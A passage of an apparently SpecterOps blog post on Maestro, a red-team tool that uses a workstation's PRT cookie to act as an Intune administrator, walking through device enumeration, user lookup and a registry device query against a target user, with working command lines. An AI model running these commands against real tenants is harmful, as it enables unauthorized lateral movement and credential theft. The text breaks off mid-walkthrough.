(-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 340px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Q0HvFPk-PaFefT-lIZpQVw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Q0HvFPk-PaFefT-lIZpQVw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Q0HvFPk-PaFefT-lIZpQVw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Q0HvFPk-PaFefT-lIZpQVw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Q0HvFPk-PaFefT-lIZpQVw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Q0HvFPk-PaFefT-lIZpQVw.png 1100w, https://miro.medium.com/v2/resize:fit:680/1*Q0HvFPk-PaFefT-lIZpQVw.png 680w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 340px"/><img alt="" class="bh md pp c" width="340" height="340" loading="lazy" role="presentation"/></picture></div></figure><p id="ce09" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Maestro, an open-source tool sponsored by <a class="af pa" href="https://specterops.io/" rel="noopener ugc nofollow" target="_blank">SpecterOps</a>, was first released at <a class="af pa" href="https://docs.google.com/presentation/d/1TGl-ASNo-1jXMOha9yd1CdPI-zCMt2UP/edit?usp=sharing&amp;ouid=114582824289521319309&amp;rtpof=true&amp;sd=true" rel="noopener ugc nofollow" target="_blank">DEF CON 2024 Demo Labs</a>. You can find the code <a class="af pa" href="https://github.com/Mayyhem/Maestro" rel="noopener ugc nofollow" target="_blank">here</a>. If compiling from source, make sure you use the Release build (or the copy on GitHub, if you trust me 😉) so that all of Maestro’s dependencies are merged into the standalone executable with <a class="af pa" href="https://github.com/CCob/dnMerge" rel="noopener ugc nofollow" target="_blank">dnMerge</a> by Ceri Coburn (<a class="af pa" href="https://x.com/_ethicalchaos_" rel="noopener ugc nofollow" target="_blank">@_ethicalchaos_</a>).</p><p id="9024" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Maestro is essentially a wrapper for local PRT cookie requests and calls to the Microsoft Graph API with a lot of quality-of-life features added for red teamers. It allows you to execute apps, scripts, and <a class="af pa" href="https://learn.microsoft.com/en-us/mem/analytics/device-query" rel="noopener ugc nofollow" target="_blank">device query</a> on Intune-enrolled devices from a C2 agent on an admin’s workstation, no password or proxy required. Data can be optionally stored in a LiteDB database that Maestro will check for valid tokens when subsequent commands are executed.</p><p id="670e" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Maestro takes care of acquiring all the necessary tokens and making the right HTTP requests to execute the action you’re attempting to take in the context of an Intune administrator. Specifically, Maestro mimics the way Edge obtains a nonce from Azure and a signed PRT cookie from the local TPM, then signs in to Intune with the authorization code OAuth flow and obtains an appropriately scoped access token for the requested resource from the mysterious <a class="af pa" href="https://github.com/Azure/portaldocs/blob/main/portal-sdk/generated/top-extensions-authentication-flow.md" rel="noopener ugc nofollow" target="_blank">DelegationToken endpoint</a>.</p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph pq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*3yGXQfW7b7nIfI1q 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*3yGXQfW7b7nIfI1q 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*3yGXQfW7b7nIfI1q 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*3yGXQfW7b7nIfI1q 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*3yGXQfW7b7nIfI1q 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*3yGXQfW7b7nIfI1q 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3yGXQfW7b7nIfI1q 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*3yGXQfW7b7nIfI1q 640w, https://miro.medium.com/v2/resize:fit:720/0*3yGXQfW7b7nIfI1q 720w, https://miro.medium.com/v2/resize:fit:750/0*3yGXQfW7b7nIfI1q 750w, https://miro.medium.com/v2/resize:fit:786/0*3yGXQfW7b7nIfI1q 786w, https://miro.medium.com/v2/resize:fit:828/0*3yGXQfW7b7nIfI1q 828w, https://miro.medium.com/v2/resize:fit:1100/0*3yGXQfW7b7nIfI1q 1100w, https://miro.medium.com/v2/resize:fit:1400/0*3yGXQfW7b7nIfI1q 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="589" loading="lazy" role="presentation"/></picture></div></div></figure><h1 id="3530" class="nu nv gu bf nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or bk">Executing the “Death from Above” Attack Path</h1><p id="0392" class="pw-post-body-paragraph mw mx gu my b mz os nb nc nd ot nf ng nh ou nj nk nl ov nn no np ow nr ns nt gn bk">Let’s walk through how to execute scripts, applications, and device query on Intune devices with Maestro using the Mythic C2 framework by Cody Thomas (<a class="af pa" href="https://x.com/its_a_feature_" rel="noopener ugc nofollow" target="_blank">@its_a_feature_</a>) and the SpecterOps <a class="af pa" href="https://github.com/MythicAgents/Apollo" rel="noopener ugc nofollow" target="_blank">Apollo</a> Mythic C2 agent for inline assembly execution. Note that Apollo is a C2 agent we use in <a class="af pa" href="https://specterops.io/training/" rel="noopener ugc nofollow" target="_blank">our training offerings</a> and it was designed without stealth as a primary concern, so it will likely be detected in a real-world environment.</p><p id="cf4c" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">If something goes wrong, keep in mind that you can run any Maestro command with the `-h` flag to display its full usage.</p></div></div><div class="po"><div class="ab cb"><div class="ly pv lz pw ma px cf py cg pz ci bh"><figure class="pj pk pl pm pn po qb qc paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qa"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*cECCV24NZckb1gBr 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*cECCV24NZckb1gBr 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*cECCV24NZckb1gBr 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*cECCV24NZckb1gBr 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*cECCV24NZckb1gBr 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*cECCV24NZckb1gBr 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/0*cECCV24NZckb1gBr 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*cECCV24NZckb1gBr 640w, https://miro.medium.com/v2/resize:fit:720/0*cECCV24NZckb1gBr 720w, https://miro.medium.com/v2/resize:fit:750/0*cECCV24NZckb1gBr 750w, https://miro.medium.com/v2/resize:fit:786/0*cECCV24NZckb1gBr 786w, https://miro.medium.com/v2/resize:fit:828/0*cECCV24NZckb1gBr 828w, https://miro.medium.com/v2/resize:fit:1100/0*cECCV24NZckb1gBr 1100w, https://miro.medium.com/v2/resize:fit:2000/0*cECCV24NZckb1gBr 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md pp c" width="1000" height="553" loading="eager" role="presentation"/></picture></div></div></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="2c37" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Let’s say our objective is to gain access to a code repository that only Chris Thompson has access to, and we suspect that there is credential material in their home directory, so we’d like to move laterally to their workstation.</p><p id="d78e" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Recon / Locating Users</strong></p><p id="0e5e" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">First, we’ll get a list of Intune devices where <code class="cx qd qe qf qg b">cthompson</code> is the primary user, including what users were logged on the last time the device checked in. When the <code class="cx qd qe qf qg b">-d</code> option is set, Maestro searches the specified database file for a valid access token with the required scope, then refresh tokens, and finally PRTs before getting a nonce from Azure and fetching a PRT cookie signed by the local system’s TPM to authenticate subsequent requests.</p><p id="d0d4" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><code class="cx qd qe qf qg b">.\Maestro.exe -d &lt;name&gt;.db get intune devices -f &quot;userPrincipalName eq &#x27;&lt;user&gt;@&lt;tenant&gt;.onmicrosoft.com&#x27;&quot; -p usersLoggedOn</code></p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*FAVqFEp0jeWwTJo2 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*FAVqFEp0jeWwTJo2 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*FAVqFEp0jeWwTJo2 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*FAVqFEp0jeWwTJo2 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*FAVqFEp0jeWwTJo2 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*FAVqFEp0jeWwTJo2 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*FAVqFEp0jeWwTJo2 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*FAVqFEp0jeWwTJo2 640w, https://miro.medium.com/v2/resize:fit:720/0*FAVqFEp0jeWwTJo2 720w, https://miro.medium.com/v2/resize:fit:750/0*FAVqFEp0jeWwTJo2 750w, https://miro.medium.com/v2/resize:fit:786/0*FAVqFEp0jeWwTJo2 786w, https://miro.medium.com/v2/resize:fit:828/0*FAVqFEp0jeWwTJo2 828w, https://miro.medium.com/v2/resize:fit:1100/0*FAVqFEp0jeWwTJo2 1100w, https://miro.medium.com/v2/resize:fit:1400/0*FAVqFEp0jeWwTJo2 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="383" loading="eager" role="presentation"/></picture></div></div></figure><p id="7dab" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Next, Maestro uses the PRT cookie to request a <code class="cx qd qe qf qg b">code</code> and <code class="cx qd qe qf qg b">id_token</code> from Azure, uses them to obtain a <code class="cx qd qe qf qg b">portalAuthorization</code> blob containing a refresh token from the <code class="cx qd qe qf qg b">authorize</code> endpoint, and uses the refresh token to obtain an access token for Intune device management from the <code class="cx qd qe qf qg b">DelegationToken</code> endpoint.</p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*hIpxcicOVIE7iNk7 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*hIpxcicOVIE7iNk7 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*hIpxcicOVIE7iNk7 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*hIpxcicOVIE7iNk7 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*hIpxcicOVIE7iNk7 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*hIpxcicOVIE7iNk7 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*hIpxcicOVIE7iNk7 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*hIpxcicOVIE7iNk7 640w, https://miro.medium.com/v2/resize:fit:720/0*hIpxcicOVIE7iNk7 720w, https://miro.medium.com/v2/resize:fit:750/0*hIpxcicOVIE7iNk7 750w, https://miro.medium.com/v2/resize:fit:786/0*hIpxcicOVIE7iNk7 786w, https://miro.medium.com/v2/resize:fit:828/0*hIpxcicOVIE7iNk7 828w, https://miro.medium.com/v2/resize:fit:1100/0*hIpxcicOVIE7iNk7 1100w, https://miro.medium.com/v2/resize:fit:1400/0*hIpxcicOVIE7iNk7 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="383" loading="lazy" role="presentation"/></picture></div></div></figure><p id="c025" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Then Maestro uses the access token to obtain the list of Intune devices where <code class="cx qd qe qf qg b">cthompson</code> is the primary user, including their device IDs and the IDs of users logged on.</p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*OJQFwAqHRJSVbPxj 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*OJQFwAqHRJSVbPxj 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*OJQFwAqHRJSVbPxj 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*OJQFwAqHRJSVbPxj 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*OJQFwAqHRJSVbPxj 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*OJQFwAqHRJSVbPxj 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*OJQFwAqHRJSVbPxj 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*OJQFwAqHRJSVbPxj 640w, https://miro.medium.com/v2/resize:fit:720/0*OJQFwAqHRJSVbPxj 720w, https://miro.medium.com/v2/resize:fit:750/0*OJQFwAqHRJSVbPxj 750w, https://miro.medium.com/v2/resize:fit:786/0*OJQFwAqHRJSVbPxj 786w, https://miro.medium.com/v2/resize:fit:828/0*OJQFwAqHRJSVbPxj 828w, https://miro.medium.com/v2/resize:fit:1100/0*OJQFwAqHRJSVbPxj 1100w, https://miro.medium.com/v2/resize:fit:1400/0*OJQFwAqHRJSVbPxj 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="383" loading="lazy" role="presentation"/></picture></div></div></figure><p id="0841" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">If we execute the same command again, Maestro will reuse the access token rather than going through the entire authentication flow again.</p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*NSCuqPumC9AJ6nmS 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*NSCuqPumC9AJ6nmS 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*NSCuqPumC9AJ6nmS 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*NSCuqPumC9AJ6nmS 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*NSCuqPumC9AJ6nmS 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*NSCuqPumC9AJ6nmS 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*NSCuqPumC9AJ6nmS 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*NSCuqPumC9AJ6nmS 640w, https://miro.medium.com/v2/resize:fit:720/0*NSCuqPumC9AJ6nmS 720w, https://miro.medium.com/v2/resize:fit:750/0*NSCuqPumC9AJ6nmS 750w, https://miro.medium.com/v2/resize:fit:786/0*NSCuqPumC9AJ6nmS 786w, https://miro.medium.com/v2/resize:fit:828/0*NSCuqPumC9AJ6nmS 828w, https://miro.medium.com/v2/resize:fit:1100/0*NSCuqPumC9AJ6nmS 1100w, https://miro.medium.com/v2/resize:fit:1400/0*NSCuqPumC9AJ6nmS 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="383" loading="lazy" role="presentation"/></picture></div></div></figure><p id="bb31" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Next, we’ll resolve the user ID <code class="cx qd qe qf qg b">bfb6a9c2-f3c8–4b9c-9d09–2924d38895f7</code> from the output of the previous command to a principal name, noting that it was <code class="cx qd qe qf qg b">cthompson</code> with domain SID <code class="cx qd qe qf qg b">S-1–12–1–3216419266–1268577224–606669213–4153772243</code> who was logged into the Intune device with ID <code class="cx qd qe qf qg b">e537180b-6d04–427e-bf93-dbde818400eb</code> the last time it checked in.</p><p id="a292" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><code class="cx qd qe qf qg b">.\Maestro.exe -d Maestro.db get entra users -i &lt;id&gt; --reauth</code></p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*Fl9g9KN7xic9CtnY 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*Fl9g9KN7xic9CtnY 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*Fl9g9KN7xic9CtnY 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*Fl9g9KN7xic9CtnY 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*Fl9g9KN7xic9CtnY 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*Fl9g9KN7xic9CtnY 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Fl9g9KN7xic9CtnY 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*Fl9g9KN7xic9CtnY 640w, https://miro.medium.com/v2/resize:fit:720/0*Fl9g9KN7xic9CtnY 720w, https://miro.medium.com/v2/resize:fit:750/0*Fl9g9KN7xic9CtnY 750w, https://miro.medium.com/v2/resize:fit:786/0*Fl9g9KN7xic9CtnY 786w, https://miro.medium.com/v2/resize:fit:828/0*Fl9g9KN7xic9CtnY 828w, https://miro.medium.com/v2/resize:fit:1100/0*Fl9g9KN7xic9CtnY 1100w, https://miro.medium.com/v2/resize:fit:1400/0*Fl9g9KN7xic9CtnY 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md pp c" width="700" height="383" loading="lazy" role="presentation"/></picture></div></div></figure><p id="ef2e" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Device Query</strong></p><p id="d656" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">We’ll make sure that the user is still logged in right now using device query, which, similar to SCCM’s <a class="af pa" href="https://learn.microsoft.com/en-us/mem/configmgr/core/servers/manage/cmpivot-overview" rel="noopener ugc nofollow" target="_blank">CMPivot</a> feature, allows real-time read access to Intune enrolled devices. To do that, we’ll query the Windows Registry <code class="cx qd qe qf qg b">HKEY_USERS</code> hive, which indicates that our target user’s domain SID has a session on the device right now.</p><p id="ba92" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">.<code class="cx qd qe qf qg b">\Maestro.exe -d &lt;name&gt;.db exec intune device-query -i &lt;device_id&gt; -q &#x27;WindowsRegistry(&quot;&quot;&quot;HKU\*&quot;&quot;&quot;&#x27;)</code></p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div role="button" tabindex="0" class="pr ps fj pt bh pu"><div class="pg ph qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/0*KcALG9sKoIrYdg9r 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*KcALG9sKoIrYdg9r 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*KcALG9sKoIrYdg9r 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*KcALG9sKoIrYdg9r 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*KcALG9sKoIrYdg9r 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*KcALG9sKoIrYdg9r 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*KcALG9sKoIrYdg9r 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/0*KcALG9sKoIrYdg9r 640w, https://miro.medium.com/v2/resize:fit:720/0*KcALG9sKoIrYdg9r 720w, https://miro.medium.com/v2/resize:fit:750/0*KcALG9sKoIrYdg9r 750w, https://miro.medium.com/v2/resize:fit:786/0*KcALG9sKoIrYdg9r 786w, https://miro.medium.com/v2/resize:fit:828/0*KcALG9sKoIrYdg9r 828w, https://miro.medium.com/v2/resize:fit:1100/0*KcALG9sKoIrYdg9r 1100w, https://miro.medium.com/v2/resize:fit:1400/0*KcALG9sKoIrYdg9r 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 